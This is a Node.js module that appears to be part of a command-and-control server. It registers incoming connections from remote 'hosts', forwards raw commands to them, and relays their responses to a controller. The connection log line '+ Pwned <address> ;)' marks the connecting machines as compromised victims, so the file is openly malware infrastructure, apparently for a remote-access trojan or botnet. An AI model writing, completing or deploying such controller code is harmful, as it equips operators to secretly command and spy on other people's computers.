const { Socket } = require('net');
const { PacketConnection } = require('../lib/connection');
const { packet_types } = require('../lib/protocol');
const { parsePacket, serializePacket } = require('../lib/packet');
const { controllers } = require('./control');

const hosts = [];

class Host {
    /**
     * @param {Socket} socket
     */
    constructor(socket) {
        this.connection = new PacketConnection(socket);
        this.connection.on('packet', this.handleResponse);
    }

    handleResponse(packet) {
        let wrappedPkt = {
            type: packet_types.control.response.find(
                (pkt) => pkt != null && pkt.name == 'hostresponse'
            ),
            data: packet,
        };
        controllers[0].sendResponse(wrappedPkt);
    }

    sendCommand(command) {
        this.connection.socket.write(command);
    }
}

/**
 * @param {Socket} socket
 */
function handleIncomingHost(socket) {
    let host = new Host(socket);
    let index = hosts.push(host) - 1;
    socket.on('close', () => {
        console.log(`- Host ${index} disconnected`);
        hosts.splice(index, 1);
    });
    socket.on('error', () => {
        console.log(`! Host ${index} forcibly exited`);
    });
    console.log(`+ Pwned ${socket.remoteAddress} ;)`);
}

exports.hosts = hosts;
exports.handleIncomingHost = handleIncomingHost;
